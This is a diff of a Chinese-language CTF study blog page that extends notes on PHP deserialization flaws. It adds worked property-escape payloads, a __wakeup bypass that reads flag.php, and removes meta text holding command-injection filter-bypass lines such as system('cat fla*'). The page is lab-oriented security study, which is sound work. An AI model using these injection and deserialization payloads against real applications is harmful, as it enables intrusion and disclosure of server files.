@@ -6,29 +6,49 @@
   <meta name="keywords" content=" 学习笔记 , PHP反序列化漏洞 ">
   <meta name="description" content="PHP反序列化 | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="web-命令执行web-29 发现过滤了flag关键字，这里使用*模糊匹配就行了 1?c&#x3D;system(&#x27;cat fla*&#x27;);  web-30 又过滤了system和php关键字，我们把system换成passthru加上模糊匹配即可 1?c&#x3D;passthru(&#x27;cat fla*&#x27;);  web-31 这里又把cat、单引号和空格过滤了，可以把cat换成t">
+<meta name="description" content="web-信息搜集web-1打开页面，显示where is flag？，这里直接右键查看源代码就能看到flag了   web-2打开页面显示无法查看源代码（F12和右键查看源代码被禁），这里可以使用ctrl+u快捷键查看源代码，或者在url头部添加 view-source:   web-3页面还是显示where is flag?，查看源代码也没发现flag，这里使用burpsuite抓包看看 把请求">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctfshow-命令执行">
-<meta property="og:url" content="https://mixbp.github.io/master/2025/02/17/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:title" content="ctfshow-信息搜集">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/index.html">
 <meta property="og:site_name" content="MIXBP">
-<meta property="og:description" content="web-命令执行web-29 发现过滤了flag关键字，这里使用*模糊匹配就行了 1?c&#x3D;system(&#x27;cat fla*&#x27;);  web-30 又过滤了system和php关键字，我们把system换成passthru加上模糊匹配即可 1?c&#x3D;passthru(&#x27;cat fla*&#x27;);  web-31 这里又把cat、单引号和空格过滤了，可以把cat换成t">
+<meta property="og:description" content="web-信息搜集web-1打开页面，显示where is flag？，这里直接右键查看源代码就能看到flag了   web-2打开页面显示无法查看源代码（F12和右键查看源代码被禁），这里可以使用ctrl+u快捷键查看源代码，或者在url头部添加 view-source:   web-3页面还是显示where is flag?，查看源代码也没发现flag，这里使用burpsuite抓包看看 把请求">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.png">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-3.png">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-4.png">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-5.png">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-6.png">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-7.png">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-8.png">
-<meta property="og:image" content="https://mixbp.github.io/image/">
-<meta property="article:published_time" content="2025-02-16T16:00:48.000Z">
-<meta property="article:modified_time" content="2025-02-16T17:36:17.296Z">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-2.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-3.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-4.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-5.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-6.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-7.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-8.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-9.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-10.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-11.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-12.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-13.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-14.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-15.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-16.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-17.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-18.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-19.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-20.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-21.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-22.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-23.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-24.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-25.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-26.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-27.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-28.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-29.png">
+<meta property="article:published_time" content="2025-02-23T07:24:36.000Z">
+<meta property="article:modified_time" content="2025-02-23T09:06:22.361Z">
 <meta property="article:author" content="MIXBP">
 <meta property="article:tag" content="做题笔记">
-<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="信息搜集">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png">
+<meta name="twitter:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -127,7 +147,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(23)</small>
+                <small>(24)</small>
             
         </div>
     </li>
@@ -162,8 +182,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="23">
-<input type="hidden" id="yelog_site_word_count" value="49.6k">
+<input type="hidden" id="yelog_site_posts_number" value="24">
+<input type="hidden" id="yelog_site_word_count" value="54k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -222,6 +242,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>信息搜集</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -290,6 +314,15 @@
     </div>
     
     <nav id="title-list-nav">
+        
+        
+        <a  class="All "
+           href="/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
+           data-tag="做题笔记,信息搜集"
+           data-author="" >
+            <span class="post-title" title="ctfshow-信息搜集">ctfshow-信息搜集</span>
+            <span class="post-date" title="2025-02-23 15:24:36">2025/02/23</span>
+        </a>
         
         
         <a  class="All "
@@ -537,12 +570,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2025-02-16 01:54:44'>2025-02-14 00:51</time>
+            Created At : <time class="date" title='Updated At: 2025-02-22 19:40:43'>2025-02-14 00:51</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:2.7k</span>
+        <span>Count:4k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -572,7 +605,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1"><span class="toc-text">类与对象</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-text">类的结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-text">类的内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%92%8C%E8%B5%8B%E5%80%BC"><span class="toc-text">实例化和赋值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-text">类的修饰符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95"><span class="toc-text">类的成员方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">数组序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">对象序列化</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-text">反序列化的作用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">反序列化漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#construct%E5%92%8C-destruct"><span class="toc-text">__construct和__destruct()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sleep-%E5%92%8C-wakeup"><span class="toc-text">__sleep()和__wakeup()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#toString-%E5%92%8C-invoke"><span class="toc-text">__toString()和__invoke()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">错误调用相关魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#call"><span class="toc-text">__call()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#callStatic"><span class="toc-text">__callStatic()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get"><span class="toc-text">__get()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set"><span class="toc-text">__set()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#isset"><span class="toc-text">__isset()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unset"><span class="toc-text">__unset()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#clone"><span class="toc-text">__clone()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="toc-text">魔术方法总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pop%E9%93%BE"><span class="toc-text">pop链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC%E7%BC%96%E5%86%99"><span class="toc-text">POC编写</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%9F%BA%E7%A1%80"><span class="toc-text">字符串逃逸基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%8F%E5%B0%91%E9%80%83%E9%80%B8"><span class="toc-text">字符串减少逃逸</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1"><span class="toc-text">类与对象</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-text">类的结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-text">类的内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%92%8C%E8%B5%8B%E5%80%BC"><span class="toc-text">实例化和赋值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-text">类的修饰符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95"><span class="toc-text">类的成员方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">数组序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">对象序列化</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-text">反序列化的作用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">反序列化漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#construct%E5%92%8C-destruct"><span class="toc-text">__construct和__destruct()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sleep-%E5%92%8C-wakeup"><span class="toc-text">__sleep()和__wakeup()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#toString-%E5%92%8C-invoke"><span class="toc-text">__toString()和__invoke()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">错误调用相关魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#call"><span class="toc-text">__call()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#callStatic"><span class="toc-text">__callStatic()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get"><span class="toc-text">__get()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set"><span class="toc-text">__set()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#isset"><span class="toc-text">__isset()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unset"><span class="toc-text">__unset()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#clone"><span class="toc-text">__clone()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="toc-text">魔术方法总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pop%E9%93%BE"><span class="toc-text">pop链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC%E7%BC%96%E5%86%99"><span class="toc-text">POC编写</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%9F%BA%E7%A1%80"><span class="toc-text">字符串逃逸基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%8F%E5%B0%91%E9%80%83%E9%80%B8"><span class="toc-text">字符串减少逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A2%9E%E5%A4%9A%E9%80%83%E9%80%B8"><span class="toc-text">字符串增多逃逸</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E4%BE%8B%E9%A2%98"><span class="toc-text">字符串逃逸例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A2%9E%E5%A4%9A%E9%80%83%E9%80%B8%E4%BE%8B%E9%A2%98"><span class="toc-text">字符串增多逃逸例题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%8F%E5%B0%91%E9%80%83%E9%80%B8%E4%BE%8B%E9%A2%98"><span class="toc-text">字符串减少逃逸例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#wakeup%E7%BB%95%E8%BF%87"><span class="toc-text">wakeup绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">引用的利用方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">session反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BE%8B%E9%A2%98"><span class="toc-text">session反序列化漏洞例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">phar反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFphar"><span class="toc-text">什么是phar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E7%BB%93%E6%9E%84"><span class="toc-text">phar结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">phar漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E6%96%87%E4%BB%B6%E6%9E%84%E9%80%A0%E6%A8%A1%E7%89%88"><span class="toc-text">phar文件构造模版</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">phar使用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BE%8B%E9%A2%98"><span class="toc-text">phar反序列化例题</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -785,9 +818,115 @@
 <p><strong>属性逃逸</strong></p>
 <p>一般在数据先经过一次serialize再经过unserialize，在这个中阿金反序列化的字符串变多或者变少的时候才有可能存在反序列化属性逃逸。</p>
 <h2 id="字符串减少逃逸"><a href="#字符串减少逃逸" class="headerlink" title="字符串减少逃逸"></a>字符串减少逃逸</h2><p>反序列化字符串减少逃逸：多逃逸出一个成员属性</p>
-<p>第一个字符串减少，吃掉有效代码，在第二个字符串构造代码</p>
+<p><strong>第一个字符串减少，吃掉有效代码，在第二个字符串构造代码</strong></p>
 <p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-30.png"></p>
 <p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-31.png"></p>
+<h2 id="字符串增多逃逸"><a href="#字符串增多逃逸" class="headerlink" title="字符串增多逃逸"></a>字符串增多逃逸</h2><p>反序列化字符串增多逃逸：构造出一个逃逸成员属性</p>
+<p><strong>第一个字符串增多，吐出多余代码，把多余位代码构造成逃逸的成员属性</strong></p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-32.png"></p>
+<p>构造思路：</p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-33.png"></p>
+<h1 id="字符串逃逸例题"><a href="#字符串逃逸例题" class="headerlink" title="字符串逃逸例题"></a>字符串逃逸例题</h1><h2 id="字符串增多逃逸例题"><a href="#字符串增多逃逸例题" class="headerlink" title="字符串增多逃逸例题"></a>字符串增多逃逸例题</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-34.png"></p>
+<p>思路：</p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-35.png"></p>
+<p>就是先构造我们要逃逸出来的字符串，然后计算字符串的长度，长度即为字符串增多的次数</p>
+<p>比如：这里字符串有29个字符长度</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">4</span><span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;escaping&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>所以构造29个’php’</strong></p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-36.png"></p>
+<p>payload:</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?param<span class="hljs-punctuation">=</span>phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp<span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:8:&quot;</span>escaping<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="字符串减少逃逸例题"><a href="#字符串减少逃逸例题" class="headerlink" title="字符串减少逃逸例题"></a>字符串减少逃逸例题</h2><p><strong>题目：</strong></p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-37.png"></p>
+<p><strong>构造思路：</strong></p>
+<p><strong>‘’建议吃掉，$pass的值benben可控</strong></p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-38.png"></p>
+<p>我们每次构造的时候都可以用<code>&quot;;</code>开头，这样如果多的话直接在前面补1即可</p>
+<p><strong>payload构造：</strong></p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-39.png"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?u</span>ser=flagflagflagflagflagflagflagflagflagflag&amp;pass=<span class="hljs-number">1</span><span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:6:&quot;</span>benben<span class="hljs-string">&quot;;s:3:&quot;</span>vip<span class="hljs-string">&quot;;b:1;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">解析：</span><br><span class="hljs-string">pass=1&quot;</span>;xxxx这里加了个<span class="hljs-number">1</span>因为要多吃一个，我们前面生成的<span class="hljs-string">&quot;;s:4&quot;</span>pass<span class="hljs-string">&quot;;s:xx:&quot;</span>只有<span class="hljs-number">19</span>位，加个<span class="hljs-number">1</span>刚好<span class="hljs-number">20</span>位，而这里的<span class="hljs-string">&quot;;可以理解为闭合，因为前面的双引号也被吃了</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h1><p><strong>漏洞产生的原因：如果存在wakeup方法，调用unserialize()前则先调用weakup方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过__weakup()执行。</strong></p>
+<p><strong>有版本限制</strong></p>
+<p>例题：</p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-40.png"></p>
+<p>绕过思路：</p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-41.png"></p>
+<p>payload:</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">O:<span class="hljs-number">+6</span>:<span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;<br>需要先url编码<br><br>?cmd=O<span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">22</span>secret<span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">7</span>Bs<span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-number">4</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">22</span>file<span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>Bs<span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">22</span>flag.php<span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>B<span class="hljs-meta">%</span><span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure>
+
+<h1 id="引用的利用方式"><a href="#引用的利用方式" class="headerlink" title="引用的利用方式"></a>引用的利用方式</h1><p><strong>&amp;符号的利用</strong></p>
+<p>感觉有点像c里的取地址符，指针</p>
+<p>比如：</p>
